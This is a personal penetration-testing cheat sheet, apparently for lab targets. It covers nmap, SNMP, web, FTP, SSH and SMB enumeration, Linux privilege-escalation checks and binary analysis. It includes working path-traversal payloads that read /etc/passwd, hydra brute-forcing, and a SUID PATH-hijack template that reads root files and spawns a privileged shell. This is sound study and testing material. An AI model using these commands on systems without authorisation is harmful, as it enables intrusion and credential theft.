# Cheat sheet

Only commands I have actually needed, with the small flag that matters each time.

---

## Scanning

```bash
# full TCP, fast — always -p-
nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $T

# versions + default scripts on the ports that matter
nmap -sV -sC -p21,22,80 -oN services.txt $T

# UDP: the phase everyone skips
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $T

# live hosts
nmap -sn 192.168.245.0/24 -oG - | grep -i up | awk '{print $2}'
```

---

## SNMP

```bash
# find the community string
for c in public private manager internal; do
  echo "== $c"; snmpwalk -v1 -c "$c" -t 5 -r 1 $T 1.3.6.1.2.1.1 2>&1 | head -3
done

# full walk to a file, then grep it
snmpwalk -v1 -c public -t 5 -r 1 $T > snmp_full.txt

# the three trees that matter on Linux
snmpwalk -v1 -c public $T 1.3.6.1.4.1.8072.1.3.2    # nsExtendTable (commands + descriptions)
snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.4.2.1.2    # process names
snmpwalk -v1 -c public $T 1.3.6.1.2.1.25.6.3.1.2    # installed packages
snmpwalk -v1 -c public $T 1.3.6.1.2.1.4.20.1.1      # interface IPs

# decode an nsExtendTable index suffix (5.82.69.83.69.84 -> RESET)
python3 -c "s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"

# bulk walk when v1 is slow
snmpbulkwalk -v2c -c public $T 1.3.6.1.4.1.8072.1.3.2
```

---

## Web

```bash
curl -s -i http://$T/ | head -20
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://$T/robots.txt

# path traversal tests — --path-as-is is mandatory or curl normalises the payload
curl -s --path-as-is "http://$T/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
curl -s --path-as-is "http://$T/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"

feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q

ffuf -u http://$T/ -H "Host: FUZZ" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc all -fr "Apache2 Ubuntu Default Page" -t 40 -s
```

---

## FTP

```bash
ftp -n -v $T <<< $'user anonymous anon@test\nls\nbye'    # 530 right after USER => anonymous off

hydra -L users.txt -P pass.txt -t 4 -f -V ftp://$T       # -t 4 keeps vsftpd happy

curl -s -u user:pass "ftp://$T/"                         # list
curl -s -u user:pass -o file "ftp://$T/file"             # download
```

---

## SSH

```bash
ssh-keygen -l -f id_rsa                                  # comment names the user

# BatchMode=yes so it never hangs on a password prompt
ssh -i id_rsa -o BatchMode=yes -o StrictHostKeyChecking=no user@$T id

sshpass -p 'pass' ssh -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no user@$T id

# run a whole enumeration script in one connection
ssh -i id_rsa user@$T 'bash -s' < enum.sh
```

---

## SMB

```bash
nxc smb $T -u '' -p '' --shares
nxc smb $T -u guest -p '' --shares
nxc smb $T -u user -p 'pass' -d DOMAIN --shares

smbclient //$T/share -U 'DOMAIN/user%pass' -c 'recurse; ls'
smbclient //$T/share -U 'DOMAIN/user%pass' -c 'get file.txt'
```

---

## Linux local enumeration

```bash
id; hostname; sudo -n -l; uname -a

# SUID without tripling the output on snap
find / -perm -4000 -type f 2>/dev/null | grep -v '^/snap'

find / -perm -2000 -type f 2>/dev/null | grep -v '^/snap'    # setgid
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
ss -tlnp
ls -la /home/* /opt /srv /var/www
find / -name local.txt -o -name proof.txt 2>/dev/null
```

---

## Binary analysis

```bash
file bin                                  # "not stripped" = function names survive
strings -a bin | head -40                 # system / popen / exec / bare command names
objdump -d -M intel bin | sed -n '/<main>:/,/^$/p'
readelf -d bin | grep -E 'BIND_NOW|FLAGS' # full RELRO => forget GOT overwrite
objdump -s -j .rodata bin | head          # resolve the strings passed to system()
```

Reconstructing source from a small binary:

```
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")
```

---

## Privesc — PATH hijack template

```bash
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

# name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt
```

Works only when the SUID binary calls `setuid(0)`/`seteuid(0)` **before** `system()`. If it does
not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

```bash
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
```

---

## Cleanup

```bash
D=$(mktemp -d /tmp/c.XXXXXX)
printf '#!/bin/bash\nrm -f /tmp/root_id.txt /tmp/root_proof.txt; rm -rf /tmp/x.*\n' > "$D/chpasswd"
chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
ls -la /tmp/root_id.txt        # must be "No such file or directory"
```
